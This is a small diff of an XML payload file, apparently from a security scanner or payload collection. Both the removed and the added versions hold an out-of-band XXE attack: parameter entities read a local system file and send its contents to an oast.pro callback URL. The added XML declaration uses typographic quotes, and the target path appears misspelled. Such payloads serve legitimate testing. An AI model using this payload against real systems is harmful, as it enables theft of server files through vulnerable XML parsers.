@@ -1,5 +1,3 @@
-<!DOCTYPE foo [
-    <!ENTITY % beta SYSTEM "file:///etc/password">
-    <!ENTITY % gamma SYSTEM "<!ENTITY % delta SYSTEM 'https://cyx01r7z1wg0000dcabggxqoyhryyyyyb.oast.pro/?%beta'>">
-    %gamma; %delta;
-  ]>
+<?xml version=”1.0″ encoding=”utf-8″ ?>
+<!ENTITY % beta SYSTEM "file:///etc/password">
+<!ENTITY % gamma SYSTEM "<!ENTITY % delta SYSTEM 'https://cyx01r7z1wg0000dcabggxqoyhryyyyyb.oast.pro/?%beta'>">%gamma; %delta;
